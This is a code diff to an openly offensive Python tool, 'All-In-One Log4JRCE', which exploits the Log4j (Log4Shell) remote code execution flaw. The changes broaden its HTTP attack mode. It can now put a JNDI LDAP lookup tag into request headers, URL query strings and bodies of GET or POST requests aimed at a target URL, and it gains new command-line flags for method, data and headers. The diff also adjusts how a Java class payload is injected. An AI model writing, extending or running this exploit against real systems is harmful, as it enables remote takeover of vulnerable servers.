@@ -93,7 +93,7 @@ class JavaClass():
             payload = payload.encode()
 
         if not INJECTION_TAG.encode() in self.__raw:
-            raise Exception(f"No {INJECTION_TAG}` tag to inject in code.")
+            raise Exception(f"No `{INJECTION_TAG}` tag to inject payload into.")
 
         index = self.__raw.index(INJECTION_TAG.encode())
 
@@ -257,11 +257,13 @@ class Log4RCE():
 
 class HTTPLog4RCE(Log4RCE):
     """
-    An overload of Log4RCE to automatically POSTs to a URL using form data.
+    An overload of Log4RCE to automatically inject a POST form data.
     """
 
-    url: str
-    data: str
+    url: str = ""
+    method: str = "POST"
+    data: str = ""
+    headers: str = ""
 
     def exploit(self):
         logging.info(f"HTTP -> Sending payload to {self.url}")
@@ -281,8 +283,20 @@ class HTTPLog4RCE(Log4RCE):
         else:
             conn = conn_class(parsed_url.netloc, 80)
 
-        post_data = self.data.replace(INJECTION_TAG, self.jndi_ldap_tag)
-        conn.request("POST", "/", post_data, {"Content-Type": "application/x-www-form-urlencoded"})
+        url = parsed_url.path
+        if len(parsed_url.query) > 0:
+            url += "?" + parsed_url.query
+
+        headers = {k: v[0] for k, v in urllib.parse.parse_qs(self.headers.replace(INJECTION_TAG, self.jndi_ldap_tag)).items()}
+        if self.method == "GET":
+            conn.request(method=self.method, url=url, headers=headers)
+        else:
+            body = self.data.replace(INJECTION_TAG, self.jndi_ldap_tag)
+
+            if not "Content-Type" in headers:
+                headers["Content-Type"] = "application/x-www-form-urlencoded"
+
+            conn.request(method=self.method, url=url, body=body, headers=headers)
 
 def main():
     parser = argparse.ArgumentParser(description="All-In-One Log4JRCE by alexandre-lavoie")
@@ -303,7 +317,9 @@ def main():
 
     parser_http = parser_modes.add_parser("http", help="Mode to send HTTP requests.")
     parser_http.add_argument("--url", "-u", help="The target URL.", required=True)
-    parser_http.add_argument("--data", "-d", help="The form data to inject.", required=True)
+    parser_http.add_argument("--method", "-X", help="The request method.", choices=('GET', 'POST'), default="GET")
+    parser_http.add_argument("--data", "-d", help="The request body.", default="")
+    parser_http.add_argument("--headers", "-H", help="The request headers.", default="")
 
     args = parser.parse_args()
 
@@ -335,7 +351,6 @@ def main():
     else:
         log4rce_class = Log4RCE
 
-
     log4rce = log4rce_class(
         local_ports=local_ports,
         remote_hosts=remote_hosts,
@@ -345,7 +360,9 @@ def main():
 
     if args.url:
         log4rce.url = args.url
+        log4rce.method = args.method
         log4rce.data = args.data
+        log4rce.headers = args.headers
 
     log4rce.start()
 
